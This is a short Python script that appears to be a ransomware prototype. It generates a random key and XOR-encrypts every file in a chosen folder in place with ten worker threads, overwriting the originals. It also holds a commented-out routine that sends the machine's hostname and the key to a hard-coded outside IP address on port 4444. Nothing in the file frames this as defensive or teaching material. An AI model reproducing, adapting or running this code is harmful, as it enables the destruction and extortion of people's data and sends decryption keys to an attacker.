import os, random, socket, threading, queue
from random import randint
from queue import Queue

#ENCRYPT
def encrypt(key):
    file = q.get()
    print(f'Encrypting {file}')
    try:
        key_index = 0
        max_key_index = len(key) -1
        encrypted_data = ''
        with open(file, 'rb') as f:
            data = f.read()
        with open(file, 'w') as f:
            f.write('')
        for byte in data:
            xor_byte = byte ^ ord(key[key_index])
            with open(file, 'ab') as f:
                f.write(xor_byte.to_bytes(1, 'little'))
            if key_index >= max_key_index:
                key_index = 0
            else:
                key_index += 1
            print(f'{file} successfully encrypted')
    
    except:
        print(f'Faield to encrypt {file}')
    q.task_done()
#SOCKET INFO
ip_addr = '172.104.205.65'
port = 4444

#ENCRYPTION INFO
encryption_level = 512 // 8
key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ[]#@></\?.,'
key_char_pool_len =  len(key_char_pool)

#FILE PATHS
home = os.environ['HOME']
enc_path = home + '/Projects/mac_enc/test'
files = os.listdir(enc_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{enc_path}/{f}') and f != __file__[:-2]+'txt':
        abs_files.append(f'{enc_path}/{f}')

#print(abs_files)
#GRAB HOSTNAME EDIT VARIABLE PATH LATER
host = socket.gethostname()

#GENERATE KEY\
key = ''
for i in range(encryption_level):
    key += key_char_pool[random.randint(0, key_char_pool_len-1)]

#CONNECT TO SERVER
#with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#    s.connect((ip_addr, port))
#    s.send(f'{host} : {key}'.encode('utf-8'))
#    print("Transmitting data [!]")
#    s.close()

#print(key)

#STORE FILES IN QUEUE
q = queue.Queue()
for f in abs_files:
    q.put(f)

#PREPARE THREADS

for i in range(10):
    t = threading.Thread(target=encrypt, args=(key,), daemon=True)
    t.start()

q.join()
print('Encryption completed. . .')
print(key)
input()